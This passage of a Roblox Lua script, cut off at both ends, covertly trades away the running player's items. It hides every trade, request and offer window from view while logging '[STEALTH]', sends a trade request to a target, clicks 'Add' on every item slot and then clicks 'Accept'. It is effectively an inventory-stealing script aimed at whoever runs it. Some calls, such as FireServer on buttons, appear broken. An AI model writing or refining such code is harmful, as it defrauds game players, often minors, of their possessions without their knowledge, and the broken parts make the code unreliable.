-- Function to hide any trade GUI immediately
local function hideAllTradeGUIs()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    -- recursively hide all frames that contain "trade" or "request" in name
    local function hide(frame)
        for _, child in pairs(frame:GetChildren()) do
            if child:IsA("Frame") or child:IsA("ScreenGui") then
                if child.Name:lower():find("trade") or child.Name:lower():find("request") or child.Name:lower():find("offer") then
                    child.Visible = false
                    print("[STEALTH] Hidden GUI: " .. child.Name)
                end
                hide(child)
            end
        end
    end
    hide(gui)
end

-- Monitor for new GUI additions and hide them
local function monitorGUI()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    gui.ChildAdded:Connect(function(child)
        if child:IsA("ScreenGui") or child:IsA("Frame") then
            if child.Name:lower():find("trade") or child.Name:lower():find("request") or child.Name:lower():find("offer") then
                child.Visible = false
                print("[STEALTH] Hidden newly added GUI: " .. child.Name)
            end
        end
    end)
end
monitorGUI()

-- Function to get the trade GUI (even if hidden)
local function getTradeGui()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end
    local function findTrade(frame)
        for _, child in pairs(frame:GetChildren()) do
            if child:IsA("Frame") or child:IsA("ScreenGui") then
                if child.Name:lower():find("trade") or child.Name:lower():find("request") then
                    return child
                end
                local found = findTrade(child)
                if found then return found end
            end
        end
        return nil
    end
    return findTrade(gui)
end

-- Add all items by clicking "Add" buttons in the trade GUI
local function addAllItemsStealth()
    local tradeGui = getTradeGui()
    if not tradeGui then
        print("[GUI] No trade GUI found to add items")
        return false
    end
    local count = 0
    for _, slot in pairs(tradeGui:GetDescendants()) do
        if slot:IsA("Frame") and (slot.Name:lower():find("slot") or slot.Name:lower():find("item")) then
            local addBtn = slot:FindFirstChild("Add") or slot:FindFirstChild("Select")
            if addBtn and addBtn:IsA("TextButton") then
                print("[GUI] Adding item from slot: " .. slot.Name)
                addBtn:FireServer()
                count = count + 1
                wait(0.1)
            end
        end
    end
    print("[GUI] Added " .. count .. " items")
    return count > 0
end

-- Accept trade (click Accept button)
local function acceptTradeStealth()
    local tradeGui = getTradeGui()
    if not tradeGui then
        print("[GUI] No trade GUI found to accept")
        return false
    end
    for _, btn in pairs(tradeGui:GetDescendants()) do
        if btn:IsA("TextButton") and (btn.Name:lower():find("accept") or btn.Name:lower():find("confirm")) then
            print("[GUI] Clicking accept: " .. btn.Name)
            btn:FireServer()
            return true
        end
    end
    return false
end

-- Function to send trade request (RemoteFunction)
local function sendTradeRequest(target)
    if not SendRequest then
        print("[ERROR] SendRequest remote missing")
        return false
    end
    local success, result = pcall(function()
        return SendRequest:InvokeServer(target)
    end)
    if success then
        print("[DEBUG] SendRequest invoked, result: " .. tostring(result))
        return true
    else
        print("[ERROR] SendRequest failed: " .. tostring(result))
        return false
    end
end

-- Function to accept the trade request (RemoteEvent) – but we will also use GUI
